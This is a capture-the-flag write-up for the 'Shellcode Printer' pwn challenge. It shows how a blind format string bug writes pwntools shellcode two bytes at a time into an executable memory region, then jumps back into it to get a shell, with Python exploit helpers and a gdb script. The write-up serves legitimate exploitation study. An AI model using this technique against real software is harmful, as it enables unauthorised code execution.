# Shellcode Printer
## Description of the challenge

The challenge at the start map 1 page of memory with read, write and execution permissions using mmap
```c
ptr = mmap(0, len, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_FILE|MAP_ANONYMOUS, -1, 0);
```
Then the challenge open a stream on `/dev/null`
```c
stream = fopen("/dev/null", "w");
```
Now the challenge write `\xC3` in ptr and loop incrementing `ptr`. 
```c
*ptr = 0xC3;
for ( ptr -= 2; ; ptr += 2 ){
    memset(buff, 0, 16);
    printf("Enter a format string: ");
    if ( !fgets(buff, 16, stdin) )
    {
      perror("fgets");
      goto LABEL_11; // Handle the error and return 1
    }
    buff[strcspn(buff, "\n")] = 0;
    if ( !buff[0] )
      break;
    fprintf(stream, buff);
}
```
In the loop is taken the user input via `fgets(buff, 16, stdin)`, where `buff` is a 16 bytes buffer, and is used to execute `fprintf(stream, buff)`. The loop end if the user input begin with a null byte, then the program do a call at the address pointed by the `ptr` variable
```c
return ((__int64 (*)(void))ptr)();
```

## Debugging
There is a format string vulnerability, but it can't be used to leak becouse the output of the format string is redirected to /dev/null. To debug the challenge more easily I used the following gdbscript
```gdb
set $fprintf_call=$base_address+0x000000000000145B
          b *($fprintf_call)
          commands
               set $rdi=stdout
               c
               end
```
It intercept the call to fprintf and replace the stream with **stdout**. With this little treak we can see the output of the format string (of course it will not work on remote).

## Writing shellcode
To obtain RCE we want to exploit the memory area mapped at the beginning of the execution, which has write and execution permissions. To write in that region we can use the value of ptr written in the stack which we can access through the format string as the 6th parameter.
```py
def write_bytes(content):
    if isinstance(content, bytes):
        content = int.from_bytes(content, "little")
    payload = f"%{content}c%6$hn".encode()
    p.recvuntil(b"Enter a format string: ")
    p.sendline(payload)
```
This function write 2 bytes in the memory pointed by `ptr`. Normally we want to write 2 bytes at a time becouse each iteration `ptr` got incremented by two. I also written a function to write a qword 2 bytes at a time to improve code readability (it is easier to work on qword)
```py
def write_qword(payload):
    if isinstance(payload, bytes):
        payload = int.from_bytes(payload, "little")
    if payload == 0:
        return
    write_bytes( payload & 0xffff )
    payload = payload >> 16
    write_qword(payload)
``` 

Using this functions it's easy to write a shellcode in the mapped memory region. Since we have a lot of space I used the pwntools shellcode
```py
shellcode = asm(shellcraft.sh())
    for i in range(0, len(shellcode), 8):
        write_qword(shellcode[i:i+8])
```

## Executing shellcode
Executing the shellcode is not trivial. That's becouse the execute the call after the loop we have to send an input which begin with a null byte, so the `ptr` variable will be incremented and the call will jump to the end of our shellcode. To execute the whole shellcode I used a relative jump instruction, which happen to be exactly 2 bytes long
```asm
    jmp $-0x30
```
which is represented by the bytes `\xeb\xce`. Now we have to send a null byte to exit the loop and execute our shellcode to get a shell.